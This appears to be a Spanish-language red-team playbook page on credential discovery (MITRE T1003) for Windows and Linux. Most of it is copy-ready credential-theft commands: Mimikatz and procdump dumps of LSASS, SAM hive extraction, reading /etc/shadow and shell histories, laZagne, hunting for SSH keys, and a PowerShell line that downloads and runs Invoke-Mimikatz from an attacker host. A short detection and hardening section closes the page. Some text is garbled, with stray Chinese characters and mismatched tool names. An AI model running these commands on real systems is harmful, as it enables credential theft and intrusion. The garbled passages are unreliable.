---
title: Credentials Discovery
phase: post-explotacion
platform: [windows, linux]
tags: [credentials, privesc, av evasion]
risk: critical
attack_tactic: TA0006
attack_technique: T1003
data_sources: [lsass, sam, security-events, bash-history]
last_review: 2026-05-25
---

# Credentials Discovery

### Objetivo

Extraer y reutilizar credenciales de sistemas comprometidos para垂直 y lateral movement.

### Requisitos previos

- Acceso inicial al sistema objetivo (usuario raso o admin)
- Tools: `mimikatz`, `laZagne`, `grep`, `hashcat`

### Windows

```bash
# Mimikatz - extracción de credenciales en memoria (LSASS)
mimikatz.exe "sekurlsa::logonpasswords" exit

# Dumping SAM database (registry)
reg save HKLM\\SAM C:\\temp\\sam
reg save HKLM\\SYSTEM C:\\temp\\system

# Crack with samdump2
samdump2 system sam

# Extracción de credenciales con Invoke-Mimikatz (PowerShell)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"
```

### Linux

```bash
# Credenciales en memoria /etc/shadow (requiere root)
cat /etc/shadow

# History files
cat ~/.bash_history
cat ~/.zsh_history
grep -r "password" /var/log/*.log 2>/dev/null

# laZagne (multi-backend credential harvester)
python laZagne.py all

# mempod (dump from memory on Linux)
python mimod.py
```

### One-liners

```bash
# Windows: Procdump + Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Linux: /etc/passwd readable
cat /etc/passwd

# Linux: SSH keys
find / -name id_rsa -o -name id_ed25519 -o -name "*.pem" 2>/dev/null
```

Artefactos e Indicadores

- **Windows:** Evento 4624 (logon exitoso), 4625 (logon fallido), 4634 (logoff), 4648 (logon explicit credentials), Sysmon ID 10 (process access a LSASS).
- **Linux:** Ficheros modificados en /etc/passwd, /etc/shadow, archivos de history con password strings, procesos con acceso a /dev/mem.

### Detección y Mitigación

- **Visibilidad:** Monitorear proceso accediendo a LSASS (Sysmon EID 10 con targetimage=lsass.exe), crear alertas por acceso a SAM/SYSTEM registry.
- **Hardening:** Habilitar Credential Guard, 防aguir LSASS como protected process, deshabilitar WDigest, restrict NT LM hash.

### Validación de Cobertura

- **Prueba técnica:** atomic-red-team T1003.001 ( credential dumping via mimikatz).
- **Criterio de éxito:** Alertar cuando un proceso que no sea wininit.exe, lsass.exe o services.exe accede a LSASS.
